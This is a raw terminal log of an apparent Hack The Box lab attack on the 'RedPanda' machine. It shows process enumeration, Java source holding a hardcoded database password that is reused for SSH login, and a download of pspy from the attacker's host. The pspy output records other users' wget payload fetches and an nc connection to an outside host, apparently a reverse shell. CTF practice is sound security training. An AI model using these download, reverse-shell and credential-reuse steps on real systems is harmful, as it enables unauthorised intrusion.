root         280  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_25]
root         281  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_25]
root         282  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_26]
root         283  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_26]
root         284  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_27]
root         285  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_27]
root         286  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_28]
root         287  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_28]
root         288  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_29]
root         289  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_29]
root         290  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_30]
root         291  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_30]
root         292  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_31]
root         293  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_31]
root         294  0.0  0.0      0     0 ?        S    16:04   0:02 [irq/16-vmwgfx]
root         295  0.0  0.0      0     0 ?        I<   16:04   0:00 [ttm_swap]
root         324  0.0  0.0      0     0 ?        S    16:04   0:00 [scsi_eh_32]
root         325  0.0  0.0      0     0 ?        I<   16:04   0:00 [scsi_tmf_32]
root         327  0.0  0.0      0     0 ?        I<   16:04   0:00 [kworker/1:1H-kblockd]
root         356  0.0  0.0      0     0 ?        I<   16:04   0:00 [raid5wq]
root         407  0.0  0.0      0     0 ?        S    16:04   0:00 [jbd2/sda2-8]
root         408  0.0  0.0      0     0 ?        I<   16:04   0:00 [ext4-rsv-conver]
root         409  0.0  0.0      0     0 ?        I<   16:04   0:00 [kworker/0:1H-kblockd]
root         463  0.0  0.5  52112 10460 ?        S<s  16:04   0:01 /lib/systemd/systemd-journald
root         481  0.0  0.0      0     0 ?        I<   16:04   0:00 [ipmi-msghandler]
root         492  0.0  0.2  22212  5572 ?        Ss   16:04   0:00 /lib/systemd/systemd-udevd
root         612  0.0  0.0      0     0 ?        I<   16:04   0:00 [kaluad]
root         613  0.0  0.0      0     0 ?        I<   16:04   0:00 [kmpath_rdacd]
root         614  0.0  0.0      0     0 ?        I<   16:04   0:00 [kmpathd]
root         615  0.0  0.0      0     0 ?        I<   16:04   0:00 [kmpath_handlerd]
root         616  0.0  0.8 214596 17944 ?        SLsl 16:04   0:02 /sbin/multipathd -d -s
root         652  0.0  0.5  47540 10564 ?        Ss   16:04   0:00 /usr/bin/VGAuthService
root         659  0.1  0.3 311504  8036 ?        Ssl  16:04   0:21 /usr/bin/vmtoolsd
root         668  0.0  0.2  99896  5720 ?        Ssl  16:04   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root         708  0.0  0.4 239292  9152 ?        Ssl  16:04   0:00 /usr/lib/accountsservice/accounts-daemon
root         717  0.0  0.1  81956  3704 ?        Ssl  16:04   0:00 /usr/sbin/irqbalance --foreground
root         720  0.0  0.4 236436  9036 ?        Ssl  16:04   0:00 /usr/lib/policykit-1/polkitd --no-debug
root         726  0.0  0.2  17124  5448 ?        Ss   16:04   0:00 /lib/systemd/systemd-logind
root         727  0.0  0.6 395484 13356 ?        Ssl  16:04   0:00 /usr/lib/udisks2/udisksd
root         757  0.0  0.6 318816 13120 ?        Ssl  16:04   0:00 /usr/sbin/ModemManager
root         868  0.0  0.1   6812  2756 ?        Ss   16:04   0:00 /usr/sbin/cron -f
root         870  0.0  0.1   8352  2508 ?        S    16:04   0:00 /usr/sbin/CRON -f
root         873  0.0  0.0   2608   528 ?        Ss   16:04   0:00 /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root         874  0.0  0.1   9416  3780 ?        S    16:04   0:00 sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root         875  0.0  0.3  12172  7308 ?        Ss   16:04   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         894  0.0  0.0   5828  1764 tty1     Ss+  16:04   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root        2698  0.0  0.0      0     0 ?        I    17:42   0:10 [kworker/1:2-events]
root        5886  0.0  0.0      0     0 ?        I    20:33   0:00 [kworker/0:0-events]
root        6038  0.0  0.0      0     0 ?        I    20:42   0:00 [kworker/u4:0-events_unbound]
root        6566  0.0  0.0      0     0 ?        I    21:19   0:00 [kworker/u4:1-events_power_efficient]
root        6650  0.0  0.0      0     0 ?        I    21:22   0:00 [kworker/1:1-events]
root        6673  0.0  0.0      0     0 ?        I    21:22   0:00 [kworker/0:1]
root        6807  0.0  0.0      0     0 ?        I    21:30   0:00 [kworker/u4:2]
woodenk     6866  0.0  0.0   6632   720 pts/8    S+   21:34   0:00 grep --color=auto root

woodenk@redpanda:/tmp/hsperfdata_woodenk$ find / -group logs 2>/dev/null
find / -group logs 2>/dev/null
/opt/panda_search/redpanda.log
/home/woodenk/.ssh
/home/woodenk/.ssh/authorized_keys


woodenk@redpanda:/tmp/hsperfdata_woodenk$ ls -l /opt/panda_search/redpanda.log
ls -l /opt/panda_search/redpanda.log
-rw-rw-r-- 1 root logs 1 Nov  8 21:40 /opt/panda_search/redpanda.log

woodenk@redpanda:/tmp/hsperfdata_woodenk$ cd /opt/panda_search/src/main/java/com/panda_search
cd /opt/panda_search/src/main/java/com/panda_search
woodenk@redpanda:/opt/panda_search/src/main/java/com/panda_search$ ls
ls
htb
woodenk@redpanda:/opt/panda_search/src/main/java/com/panda_search$ cd htb/panda_search/              
cd htb/panda_search/
woodenk@redpanda:/opt/panda_search/src/main/java/com/panda_search/htb/panda_search$ ls
ls
MainController.java  PandaSearchApplication.java  RequestInterceptor.java

woodenk@redpanda:/opt/panda_search/src/main/java/com/panda_search/htb/panda_search$ cat MainController.java                                                                         
cat MainController.java
package com.panda_search.htb.panda_search;

import java.util.ArrayList;
import java.io.IOException;
import java.sql.*;
import java.util.List;
import java.util.ArrayList;
import java.io.File;
import java.io.InputStream;
import java.io.FileInputStream;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.http.MediaType;

import org.apache.commons.io.IOUtils;

import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;
import org.jdom2.*;

@Controller
public class MainController {
  @GetMapping("/stats")
        public ModelAndView stats(@RequestParam(name="author",required=false) String author, Model model) throws JDOMException, IOException{
                SAXBuilder saxBuilder = new SAXBuilder();
                if(author == null)
                author = "N/A";
                author = author.strip();
                System.out.println('"' + author + '"');
                if(author.equals("woodenk") || author.equals("damian"))
                {
                        String path = "/credits/" + author + "_creds.xml";
                        File fd = new File(path);
                        Document doc = saxBuilder.build(fd);
                        Element rootElement = doc.getRootElement();
                        String totalviews = rootElement.getChildText("totalviews");
                        List<Element> images = rootElement.getChildren("image");
                        for(Element image: images)
                                System.out.println(image.getChildText("uri"));
                        model.addAttribute("noAuthor", false);
                        model.addAttribute("author", author);
                        model.addAttribute("totalviews", totalviews);
                        model.addAttribute("images", images);
                        return new ModelAndView("stats.html");
                }
                else
                {
                        model.addAttribute("noAuthor", true);
                        return new ModelAndView("stats.html");
                }
        }
  @GetMapping(value="/export.xml", produces = MediaType.APPLICATION_OCTET_STREAM_VALUE)
        public @ResponseBody byte[] exportXML(@RequestParam(name="author", defaultValue="err") String author) throws IOException {

                System.out.println("Exporting xml of: " + author);
                if(author.equals("woodenk") || author.equals("damian"))
                {
                        InputStream in = new FileInputStream("/credits/" + author + "_creds.xml");
                        System.out.println(in);
                        return IOUtils.toByteArray(in);
                }
                else
                {
                        return IOUtils.toByteArray("Error, incorrect paramenter 'author'\n\r");
                }
        }
  @PostMapping("/search")
        public ModelAndView search(@RequestParam("name") String name, Model model) {
        if(name.isEmpty())
        {
                name = "Greg";
        }
        String query = filter(name);
        ArrayList pandas = searchPanda(query);
        System.out.println("\n\""+query+"\"\n");
        model.addAttribute("query", query);
        model.addAttribute("pandas", pandas);
        model.addAttribute("n", pandas.size());
        return new ModelAndView("search.html");
        }
  public String filter(String arg) {
        String[] no_no_words = {"%", "_","$", "~", };
        for (String word : no_no_words) {
            if(arg.contains(word)){
                return "Error occured: banned characters";
            }
        }
        return arg;
    }
    public ArrayList searchPanda(String query) {

        Connection conn = null;
        PreparedStatement stmt = null;
        ArrayList<ArrayList> pandas = new ArrayList();
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
            stmt = conn.prepareStatement("SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?");
            stmt.setString(1, "%" + query + "%");
            ResultSet rs = stmt.executeQuery();
            while(rs.next()){
                ArrayList<String> panda = new ArrayList<String>();
                panda.add(rs.getString("name"));
                panda.add(rs.getString("bio"));
                panda.add(rs.getString("imgloc"));
                panda.add(rs.getString("author"));
                pandas.add(panda);
            }
        }catch(Exception e){ System.out.println(e);}
        return pandas;
    }
}

ssh:  woodenk:RedPandazRule

┌──(kali㉿kali)-[~/hackthebox]
└─$ ssh woodenk@10.10.11.170
The authenticity of host '10.10.11.170 (10.10.11.170)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:193: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.170' (ED25519) to the list of known hosts.
woodenk@10.10.11.170's password:  RedPandazRule
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 08 Nov 2022 09:52:51 PM UTC

  System load:           0.02
  Usage of /:            86.5% of 4.30GB
  Memory usage:          74%
  Swap usage:            0%
  Processes:             240
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.170
  IPv6 address for eth0: dead:beef::250:56ff:feb9:1c59

  => / is using 86.5% of 4.30GB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Jul  5 05:51:25 2022 from 10.10.14.23
woodenk@redpanda:~$ 
https://github.com/DominicBreuker/pspy
┌──(kali㉿kali)-[~/Downloads]
└─$ mv pspy64s ../hackthebox 
                                                                                          
┌──(kali㉿kali)-[~/Downloads]
└─$ cd ../hackthebox  

using pspy64,a JAR file is executed by root.

woodenk@redpanda:/tmp$ wget 10.10.14.133:8000/pspy64s
--2022-11-08 22:01:10--  http://10.10.14.133:8000/pspy64s
Connecting to 10.10.14.133:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1156536 (1.1M) [application/octet-stream]
Saving to: ‘pspy64s’

pspy64s                100%[==========================>]   1.10M   815KB/s    in 1.4s    

2022-11-08 22:01:11 (815 KB/s) - ‘pspy64s’ saved [1156536/1156536]

woodenk@redpanda:/tmp$ chmod +x pspy64s
woodenk@redpanda:/tmp$ ls
hsperfdata_root
hsperfdata_woodenk
MANIFEST.MF
priv.java
pspy64
pspy64.1
pspy64s
systemd-private-f54d74ddd22547e1b2a93b2e966f77d1-ModemManager.service-MtLgtf
systemd-private-f54d74ddd22547e1b2a93b2e966f77d1-systemd-logind.service-GZNAng
systemd-private-f54d74ddd22547e1b2a93b2e966f77d1-systemd-resolved.service-QizEEf
systemd-private-f54d74ddd22547e1b2a93b2e966f77d1-systemd-timesyncd.service-8noXVg
tomcat.8080.16582195902703730950
tomcat-docbase.8080.5643265930622448518
vmware-root_659-4013788787
woodenk@redpanda:/tmp$ ./pspy64s
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2022/11/08 22:01:57 CMD: UID=0    PID=99     | 
2022/11/08 22:01:57 CMD: UID=0    PID=98     | 
2022/11/08 22:01:57 CMD: UID=0    PID=97     | 
2022/11/08 22:01:57 CMD: UID=0    PID=96     | 
2022/11/08 22:01:57 CMD: UID=0    PID=95     | 
2022/11/08 22:01:57 CMD: UID=0    PID=94     | 
2022/11/08 22:01:57 CMD: UID=0    PID=93     | 
2022/11/08 22:01:57 CMD: UID=113  PID=923    | /usr/sbin/mysqld 
2022/11/08 22:01:57 CMD: UID=0    PID=92     | 
2022/11/08 22:01:57 CMD: UID=0    PID=91     | 
2022/11/08 22:01:57 CMD: UID=0    PID=9      | 
2022/11/08 22:01:57 CMD: UID=0    PID=894    | /sbin/agetty -o -p -- \u --noclear tty1 linux                                                                                        
2022/11/08 22:01:57 CMD: UID=0    PID=89     | 
2022/11/08 22:01:57 CMD: UID=0    PID=88     | 
2022/11/08 22:01:57 CMD: UID=1000 PID=877    | java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar                                                                   
2022/11/08 22:01:57 CMD: UID=0    PID=875    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups                                                                              
2022/11/08 22:01:57 CMD: UID=0    PID=874    | sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar                                           
2022/11/08 22:01:57 CMD: UID=0    PID=873    | /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar                                
2022/11/08 22:01:57 CMD: UID=0    PID=872    | /usr/sbin/atd -f 
2022/11/08 22:01:57 CMD: UID=0    PID=870    | /usr/sbin/CRON -f 
2022/11/08 22:01:57 CMD: UID=0    PID=868    | /usr/sbin/cron -f 
2022/11/08 22:01:57 CMD: UID=0    PID=85     | 
2022/11/08 22:01:57 CMD: UID=0    PID=84     | 
2022/11/08 22:01:57 CMD: UID=0    PID=83     | 
2022/11/08 22:01:57 CMD: UID=101  PID=824    | /lib/systemd/systemd-resolved 
2022/11/08 22:01:57 CMD: UID=0    PID=82     | 
2022/11/08 22:01:57 CMD: UID=0    PID=81     | 
2022/11/08 22:01:57 CMD: UID=0    PID=80     | 
2022/11/08 22:01:57 CMD: UID=0    PID=79     | 
2022/11/08 22:01:57 CMD: UID=0    PID=78     | 
2022/11/08 22:01:57 CMD: UID=0    PID=77     | 
2022/11/08 22:01:57 CMD: UID=0    PID=757    | /usr/sbin/ModemManager 
2022/11/08 22:01:57 CMD: UID=0    PID=7405   | /lib/systemd/systemd-udevd 
2022/11/08 22:01:57 CMD: UID=1000 PID=7398   | ./pspy64s 
2022/11/08 22:01:57 CMD: UID=0    PID=7309   | 
2022/11/08 22:01:57 CMD: UID=0    PID=727    | /usr/lib/udisks2/udisksd 
2022/11/08 22:01:57 CMD: UID=1000 PID=7261   | -bash 
2022/11/08 22:01:57 CMD: UID=0    PID=726    | /lib/systemd/systemd-logind 
2022/11/08 22:01:57 CMD: UID=1000 PID=7258   | sshd: woodenk@pts/8  
2022/11/08 22:01:57 CMD: UID=104  PID=723    | /usr/sbin/rsyslogd -n -iNONE 
2022/11/08 22:01:57 CMD: UID=0    PID=720    | /usr/lib/policykit-1/polkitd --no-debug 
2022/11/08 22:01:57 CMD: UID=0    PID=717    | /usr/sbin/irqbalance --foreground 
2022/11/08 22:01:57 CMD: UID=0    PID=7155   | 
2022/11/08 22:01:57 CMD: UID=1000 PID=7151   | (sd-pam) 
2022/11/08 22:01:57 CMD: UID=1000 PID=7150   | /lib/systemd/systemd --user 
2022/11/08 22:01:57 CMD: UID=0    PID=7133   | sshd: woodenk [priv] 
2022/11/08 22:01:57 CMD: UID=103  PID=709    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only                             
2022/11/08 22:01:57 CMD: UID=0    PID=708    | /usr/lib/accountsservice/accounts-daemon 
2022/11/08 22:01:57 CMD: UID=1000 PID=6714   | wget 10.10.14.113/r.elf 
2022/11/08 22:01:57 CMD: UID=1000 PID=6695   | wget 10.10.14.113:8000/r.elf 
2022/11/08 22:01:57 CMD: UID=0    PID=668    | /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0                                                                                   
2022/11/08 22:01:57 CMD: UID=0    PID=6650   | 
2022/11/08 22:01:57 CMD: UID=0    PID=659    | /usr/bin/vmtoolsd 
2022/11/08 22:01:57 CMD: UID=0    PID=652    | /usr/bin/VGAuthService 
2022/11/08 22:01:57 CMD: UID=102  PID=638    | /lib/systemd/systemd-timesyncd 
2022/11/08 22:01:57 CMD: UID=0    PID=616    | /sbin/multipathd -d -s 
2022/11/08 22:01:57 CMD: UID=0    PID=615    | 
2022/11/08 22:01:57 CMD: UID=0    PID=614    | 
2022/11/08 22:01:57 CMD: UID=0    PID=613    | 
2022/11/08 22:01:57 CMD: UID=0    PID=612    | 
2022/11/08 22:01:57 CMD: UID=0    PID=6038   | 
2022/11/08 22:01:57 CMD: UID=0    PID=6      | 
2022/11/08 22:01:57 CMD: UID=0    PID=5886   | 
2022/11/08 22:01:57 CMD: UID=1000 PID=5397   | /bin/bash 
2022/11/08 22:01:57 CMD: UID=1000 PID=5396   | python3 -c import pty; pty.spawn("/bin/bash")                                                                                        
2022/11/08 22:01:57 CMD: UID=1000 PID=5380   | /bin/sh 
2022/11/08 22:01:57 CMD: UID=0    PID=492    | /lib/systemd/systemd-udevd 
2022/11/08 22:01:57 CMD: UID=0    PID=481    | 
2022/11/08 22:01:57 CMD: UID=0    PID=463    | /lib/systemd/systemd-journald 
2022/11/08 22:01:57 CMD: UID=1000 PID=4170   | /bin/bash 
2022/11/08 22:01:57 CMD: UID=1000 PID=4169   | python3 -c import pty; pty.spawn("/bin/bash")                                                                                        
2022/11/08 22:01:57 CMD: UID=1000 PID=4146   | /bin/sh 
2022/11/08 22:01:57 CMD: UID=1000 PID=4144   | dd 
2022/11/08 22:01:57 CMD: UID=0    PID=409    | 
2022/11/08 22:01:57 CMD: UID=0    PID=408    | 
2022/11/08 22:01:57 CMD: UID=0    PID=407    | 
2022/11/08 22:01:57 CMD: UID=0    PID=4      | 
2022/11/08 22:01:57 CMD: UID=1000 PID=3992   | /bin/bash 
2022/11/08 22:01:57 CMD: UID=1000 PID=3991   | python3 -c import pty; pty.spawn("/bin/bash")                                                                                        
2022/11/08 22:01:57 CMD: UID=1000 PID=3990   | nc 10.10.14.237 8888 
2022/11/08 22:01:57 CMD: UID=1000 PID=3985   | /bin/sh 
2022/11/08 22:01:57 CMD: UID=1000 PID=3711   | /bin/bash 
2022/11/08 22:01:57 CMD: UID=1000 PID=3710   | python3 -c import pty; pty.spawn("/bin/bash")                                                                                        
2022/11/08 22:01:57 CMD: UID=1000 PID=3709   | /bin/sh 
2022/11/08 22:01:57 CMD: UID=0    PID=356    | 
2022/11/08 22:01:57 CMD: UID=0    PID=327    | 
2022/11/08 22:01:57 CMD: UID=0    PID=325    | 
2022/11/08 22:01:57 CMD: UID=0    PID=324    | 
2022/11/08 22:01:57 CMD: UID=0    PID=30     | 
2022/11/08 22:01:57 CMD: UID=0    PID=3      | 
2022/11/08 22:01:57 CMD: UID=0    PID=295    | 
2022/11/08 22:01:57 CMD: UID=0    PID=294    | 
2022/11/08 22:01:57 CMD: UID=0    PID=293    | 
2022/11/08 22:01:57 CMD: UID=0    PID=292    | 
2022/11/08 22:01:57 CMD: UID=0    PID=291    | 
2022/11/08 22:01:57 CMD: UID=0    PID=290    | 
2022/11/08 22:01:57 CMD: UID=0    PID=29     | 
2022/11/08 22:01:57 CMD: UID=0    PID=289    | 
2022/11/08 22:01:57 CMD: UID=0    PID=288    | 
2022/11/08 22:01:57 CMD: UID=0    PID=287    | 
2022/11/08 22:01:57 CMD: UID=0    PID=286    | 
2022/11/08 22:01:57 CMD: UID=0    PID=285    | 
2022/11/08 22:01:57 CMD: UID=0    PID=284    | 
2022/11/08 22:01:57 CMD: UID=0    PID=283    | 
2022/11/08 22:01:57 CMD: UID=0    PID=282    | 
2022/11/08 22:01:57 CMD: UID=0    PID=281    | 
2022/11/08 22:01:57 CMD: UID=0    PID=280    | 
2022/11/08 22:01:57 CMD: UID=0    PID=28     | 
2022/11/08 22:01:57 CMD: UID=0    PID=279    | 
2022/11/08 22:01:57 CMD: UID=0    PID=278    | 
2022/11/08 22:01:57 CMD: UID=0    PID=277    | 
2022/11/08 22:01:57 CMD: UID=0    PID=276    | 
2022/11/08 22:01:57 CMD: UID=0    PID=275    | 
2022/11/08 22:01:57 CMD: UID=0    PID=274    | 
2022/11/08 22:01:57 CMD: UID=0    PID=273    | 
2022/11/08 22:01:57 CMD: UID=0    PID=272    | 
2022/11/08 22:01:57 CMD: UID=0    PID=271    | 
2022/11/08 22:01:57 CMD: UID=0    PID=270    | 
2022/11/08 22:01:57 CMD: UID=0    PID=27     | 
2022/11/08 22:01:57 CMD: UID=0    PID=2698   | 
2022/11/08 22:01:57 CMD: UID=0    PID=269    | 
2022/11/08 22:01:57 CMD: UID=0    PID=268    | 
2022/11/08 22:01:57 CMD: UID=0    PID=267    | 
2022/11/08 22:01:57 CMD: UID=0    PID=266    | 
2022/11/08 22:01:57 CMD: UID=0    PID=265    | 
2022/11/08 22:01:57 CMD: UID=0    PID=264    | 
2022/11/08 22:01:57 CMD: UID=0    PID=263    | 
2022/11/08 22:01:57 CMD: UID=0    PID=262    | 
2022/11/08 22:01:57 CMD: UID=0    PID=261    | 
2022/11/08 22:01:57 CMD: UID=0    PID=260    | 
2022/11/08 22:01:57 CMD: UID=0    PID=26     | 
2022/11/08 22:01:57 CMD: UID=0    PID=259    | 
2022/11/08 22:01:57 CMD: UID=1000 PID=2583   | /bin/bash 
2022/11/08 22:01:57 CMD: UID=1000 PID=2582   | sh -c /bin/bash 
2022/11/08 22:01:57 CMD: UID=1000 PID=2581   | script -qc /bin/bash /dev/null 
2022/11/08 22:01:57 CMD: UID=0    PID=258    | 
2022/11/08 22:01:57 CMD: UID=0    PID=257    | 
2022/11/08 22:01:57 CMD: UID=0    PID=256    | 
2022/11/08 22:01:57 CMD: UID=0    PID=255    | 
2022/11/08 22:01:57 CMD: UID=0    PID=254    | 
2022/11/08 22:01:57 CMD: UID=0    PID=253    | 
2022/11/08 22:01:57 CMD: UID=0    PID=252    | 
2022/11/08 22:01:57 CMD: UID=0    PID=251    | 
2022/11/08 22:01:57 CMD: UID=0    PID=250    | 
2022/11/08 22:01:57 CMD: UID=0    PID=25     | 
2022/11/08 22:01:57 CMD: UID=0    PID=249    | 
2022/11/08 22:01:57 CMD: UID=1000 PID=2489   | /bin/bash 
2022/11/08 22:01:57 CMD: UID=1000 PID=2482   | /bin/bash 
2022/11/08 22:01:57 CMD: UID=1000 PID=2481   | python3 -c import pty; pty.spawn("/bin/bash")                                                                                        
2022/11/08 22:01:57 CMD: UID=0    PID=248    | 
2022/11/08 22:01:57 CMD: UID=1000 PID=2478   | /bin/sh 
2022/11/08 22:01:57 CMD: UID=0    PID=247    | 
2022/11/08 22:01:57 CMD: UID=0    PID=246    | 
2022/11/08 22:01:57 CMD: UID=0    PID=245    | 
2022/11/08 22:01:57 CMD: UID=0    PID=244    | 
2022/11/08 22:01:57 CMD: UID=0    PID=243    | 
2022/11/08 22:01:57 CMD: UID=0    PID=242    | 
2022/11/08 22:01:57 CMD: UID=0    PID=241    | 
2022/11/08 22:01:57 CMD: UID=0    PID=240    | 
2022/11/08 22:01:57 CMD: UID=0    PID=24     | 
2022/11/08 22:01:57 CMD: UID=1000 PID=2379   | /bin/bash 
2022/11/08 22:01:57 CMD: UID=1000 PID=2378   | python3 -c import pty; pty.spawn("/bin/bash")                                                                                        
2022/11/08 22:01:57 CMD: UID=1000 PID=2376   | /bin/sh 
2022/11/08 22:01:57 CMD: UID=0    PID=237    | 
2022/11/08 22:01:57 CMD: UID=0    PID=233    | 
2022/11/08 22:01:57 CMD: UID=0    PID=23     | 
2022/11/08 22:01:57 CMD: UID=0    PID=229    | 
2022/11/08 22:01:57 CMD: UID=0    PID=226    | 
2022/11/08 22:01:57 CMD: UID=0    PID=223    | 
2022/11/08 22:01:57 CMD: UID=0    PID=22     | 
2022/11/08 22:01:57 CMD: UID=0    PID=215    | 
2022/11/08 22:01:57 CMD: UID=0    PID=210    | 
2022/11/08 22:01:57 CMD: UID=0    PID=21     | 
2022/11/08 22:01:57 CMD: UID=0    PID=207    | 
2022/11/08 22:01:57 CMD: UID=1000 PID=2045   | /bin/bash 
2022/11/08 22:01:57 CMD: UID=1000 PID=2044   | python3 -c import pty; pty.spawn("/bin/bash")                                                                                        
2022/11/08 22:01:57 CMD: UID=1000 PID=2019   | /bin/sh 
2022/11/08 22:01:57 CMD: UID=0    PID=20     | 
2022/11/08 22:01:57 CMD: UID=0    PID=2      | 
2022/11/08 22:01:57 CMD: UID=0    PID=197    | 
2022/11/08 22:01:57 CMD: UID=0    PID=18     | 
2022/11/08 22:01:57 CMD: UID=0    PID=17     | 
2022/11/08 22:01:57 CMD: UID=0    PID=16     | 
2022/11/08 22:01:57 CMD: UID=0    PID=157    | 
2022/11/08 22:01:57 CMD: UID=0    PID=15     | 
2022/11/08 22:01:57 CMD: UID=0    PID=144    | 
2022/11/08 22:01:57 CMD: UID=0    PID=141    | 
2022/11/08 22:01:57 CMD: UID=0    PID=14     | 
2022/11/08 22:01:57 CMD: UID=0    PID=131    | 
2022/11/08 22:01:57 CMD: UID=0    PID=130    | 
2022/11/08 22:01:57 CMD: UID=0    PID=13     | 
2022/11/08 22:01:57 CMD: UID=0    PID=128    | 
2022/11/08 22:01:57 CMD: UID=0    PID=127    | 
2022/11/08 22:01:57 CMD: UID=0    PID=126    | 
2022/11/08 22:01:57 CMD: UID=0    PID=125    | 
2022/11/08 22:01:57 CMD: UID=0    PID=124    | 
2022/11/08 22:01:57 CMD: UID=0    PID=123    | 
2022/11/08 22:01:57 CMD: UID=0    PID=122    | 
2022/11/08 22:01:57 CMD: UID=0    PID=121    | 
2022/11/08 22:01:57 CMD: UID=0    PID=120    | 
2022/11/08 22:01:57 CMD: UID=0    PID=12     | 
2022/11/08 22:01:57 CMD: UID=0    PID=119    | 
2022/11/08 22:01:57 CMD: UID=0    PID=118    | 
2022/11/08 22:01:57 CMD: UID=0    PID=117    | 
2022/11/08 22:01:57 CMD: UID=0    PID=116    | 
2022/11/08 22:01:57 CMD: UID=0    PID=115    | 
2022/11/08 22:01:57 CMD: UID=0    PID=114    | 
2022/11/08 22:01:57 CMD: UID=0    PID=113    | 
2022/11/08 22:01:57 CMD: UID=0    PID=112    | 
2022/11/08 22:01:57 CMD: UID=0    PID=111    | 
2022/11/08 22:01:57 CMD: UID=0    PID=110    | 
2022/11/08 22:01:57 CMD: UID=0    PID=11     | 
2022/11/08 22:01:57 CMD: UID=0    PID=109    | 
2022/11/08 22:01:57 CMD: UID=0    PID=108    | 
2022/11/08 22:01:57 CMD: UID=0    PID=107    | 
2022/11/08 22:01:57 CMD: UID=0    PID=106    | 
2022/11/08 22:01:57 CMD: UID=0    PID=105    | 
2022/11/08 22:01:57 CMD: UID=0    PID=104    | 
2022/11/08 22:01:57 CMD: UID=0    PID=103    | 
2022/11/08 22:01:57 CMD: UID=0    PID=102    | 
2022/11/08 22:01:57 CMD: UID=0    PID=101    | 
2022/11/08 22:01:57 CMD: UID=0    PID=100    | 
2022/11/08 22:01:57 CMD: UID=0    PID=10     | 
2022/11/08 22:01:57 CMD: UID=0    PID=1      | /sbin/init maybe-ubiquity 
2022/11/08 22:02:01 CMD: UID=0    PID=7408   | /usr/sbin/CRON -f 
2022/11/08 22:02:01 CMD: UID=0    PID=7409   | /usr/sbin/CRON -f 
2022/11/08 22:02:01 CMD: UID=0    PID=7410   | /bin/sh /root/run_credits.sh 
2022/11/08 22:02:01 CMD: UID=0    PID=7411   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar  

looks fine three people are doing this machine :)

2022/11/08 22:10:01 CMD: UID=0    PID=7511   | /usr/sbin/CRON -f 
2022/11/08 22:10:01 CMD: UID=0    PID=7512   | sudo -u woodenk /opt/cleanup.sh 
2022/11/08 22:10:01 CMD: UID=1000 PID=7520   | /bin/bash /opt/cleanup.sh 
